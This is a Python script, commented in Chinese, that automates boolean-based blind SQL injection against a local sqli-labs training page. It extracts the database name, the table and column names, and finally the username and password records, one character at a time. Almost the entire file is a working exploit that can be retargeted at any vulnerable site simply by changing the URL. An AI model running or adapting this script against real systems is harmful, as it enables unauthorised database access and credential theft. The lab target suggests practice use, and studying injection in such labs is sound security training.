# -*- coding:utf-8 -*-
import requests

'''
布尔盲注脚本，如果HTTP请求结果中包含You are in，代表判断正确

'''
def ascii_str(): #生成库名表名字符所在的字符列表字典
	str_list=[]
	for i in range(33,127): #所有可显示字符的ASCII码
		str_list.append(chr(i))
	#print('可显示字符：%s'%str_list)
	return str_list #返回字符列表

def db_length(url,str):
	print("[-]开始测试数据库名长度.......")
	num=1
	while True:
		db_payload=url+"' and (length(database())=%d)--+"%num
		r=requests.get(db_payload)
		if str in r.text:
			db_length=num
			print("[+]数据库长度：%d\n"%db_length)
			db_name(db_length) #进行下一步，测试库名
			break
		else:
			num += 1

def db_name(db_length):
	print("[-]开始测试数据库名.......")
	db_name=''
	str_list=ascii_str()
	for i in range(1,db_length+1):
		for j in str_list:
			db_payload=url+"' and (ord(mid(database(),%d,1))='%s')--+"%(i,ord(j))
			r=requests.get(db_payload)
			if str in r.text:
				db_name+=j
				break
	print("[+]数据库名：%s\n"%db_name)
	tb_piece(db_name) #进行下一步，测试security数据库有几张表
	return db_name
	
def tb_piece(db_name):
	print("开始测试%s数据库有几张表........"%db_name)
	for i in range(100): #猜解库中有多少张表，合理范围即可
		tb_payload=url+"' and %d=(select count(table_name) from information_schema.tables where table_schema='%s')--+"%(i,db_name)
		r=requests.get(tb_payload)
		if str in r.text:
			tb_piece=i
			break
	print("[+]%s库一共有%d张表\n"%(db_name,tb_piece))
	tb_name(db_name,tb_piece) #进行下一步，猜解表名


def tb_name(db_name,tb_piece):
	print("[-]开始猜解表名.......")
	table_list=[]
	for i in range(tb_piece):
		str_list=ascii_str()
		tb_length=0
		tb_name=''
		for j in range(1,20): #表名长度，合理范围即可
			tb_payload=url+"' and (select length(table_name) from information_schema.tables where table_schema=database() limit %d,1)=%d--+"%(i,j)
			r=requests.get(tb_payload)
			if str in r.text:
				tb_length=j
				print("第%d张表名长度：%s"%(i+1,tb_length))
				for k in range(1,tb_length+1): #根据表名长度进行截取对比
					for l in str_list:
						tb_payload=url+"' and (select ord(mid((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1)))=%d--+"%(i,k,ord(l))
						r=requests.get(tb_payload)
						if str in r.text:
							tb_name+=l
				print("[+]：%s"%tb_name)
				table_list.append(tb_name)
				break
	print("\n[+]%s库下的%s张表：%s\n"%(db_name,tb_piece,table_list))
	column_num(table_list,db_name) #进行下一步，猜解每张表的字段数

def column_num(table_list,db_name):
	print("[-]开始猜解每张表的字段数：.......")
	column_num_list=[]
	for i in table_list:
		for j in range(30): #每张表的字段数量，合理范围即可
			column_payload=url+"' and %d=(select count(column_name) from information_schema.columns where table_schema='%s' and table_name='%s')--+"%(j,db_name,i)
			r=requests.get(column_payload)
			if str in r.text:
				column_num=j
				column_num_list.append(column_num) #把所有表的字段，依次放入这个列表当中
				print("[+]%s表\t%s个字段"%(i,column_num))
				break
	print("\n[+]表对应的字段数：%s\n"%column_num_list)
	column_name(table_list,column_num_list,db_name) #进行下一步，猜解每张表的字段名

def column_name(table_list,column_num_list,db_name):
	print("[-]开始猜解每张表的字段名.......")
	column_length=[]
	str_list=ascii_str()
	column_name_list=[]
	for t in range(len(table_list)): #t在这里代表每张表的列表索引位置
		print("\n[+]%s表的字段："%table_list[t])
		for i in range(column_num_list[t]): #i表示每张表的字段数量
			column_name=''
			for j in range(1,21): #j表示每个字段的长度
				column_name_length=url+"' and %d=(select length(column_name) from information_schema.columns where table_schema='%s' and table_name='%s' limit %d,1)--+"%(j-1,db_name,table_list[t],i)
				#print("pppppppp"+column_name_length)
				r=requests.get(column_name_length)
				if str in r.text:
					column_length.append(j)
					break
				for k in str_list: #k表示我们猜解的字符字典
					column_payload=url+"' and ord(mid((select column_name from information_schema.columns where table_schema='%s' and table_name='%s' limit %d,1),%d,1))=%d--+"%(db_name,table_list[t],i,j,ord(k))
					r=requests.get(column_payload)
					if str in r.text:
						column_name+=k
			print('[+]：%s'%column_name)
			column_name_list.append(column_name)
	#print(column_name_list)#输出所有表中的字段名到一个列表中
	dump_data(table_list,column_name_list,db_name) #进行最后一步，输出指定字段的数据

def dump_data(table_list,column_name_list,db_name):
	print("\n[-]对%s表的%s字段进行爆破.......\n"%(table_list[3],column_name_list[9:12]))
	str_list=ascii_str()
	for i in column_name_list[9:12]: #id,username,password字段
		data_num = 0
		for j in range(101):#j表示有多少条数据，合理范围即可
			data_num_payload=url+"' and (select count(%s) from %s.%s)=%d--+"%(i,db_name,table_list[3],j)
			#print('pppppppp'+data_num_payload)
			r=requests.get(data_num_payload)
			if str in r.text:
				data_num=j
				break
		print("\n[+]%s表中的%s字段有以下%s条数据："%(table_list[3],i,data_num))
		for k in range(data_num):
			data_len=0
			dump_data=''
			for l in range(1,21):#l表示每条数据的长度，合理范围即可
				data_len_payload=url+"' and ascii(substr((select %s from %s.%s limit %d,1),%d,1))--+"%(i,db_name,table_list[3],k,l)
				r=requests.get(data_len_payload)
				if str not in r.text:
					data_len=l-1
					for x in range(1,data_len+1):#x表示每条数据的实际范围，作为mid截取的范围
						for y in str_list:
							data_payload=url+"' and ord(mid((select %s from %s.%s limit %d,1),%d,1))=%d--+"%(i,db_name,table_list[3],k,x,ord(y))
							r=requests.get(data_payload)
							if str in r.text:
								dump_data+=y
								break
					break
			print('[+]%s'%dump_data)#输出每条数据



if __name__ == '__main__':
	url="http://127.0.0.1/sqli-labs/Less-5/?id=1"#目标url
	str="You are in"#布尔型盲注的true&false的判断因素
	db_length(url,str)#程序入口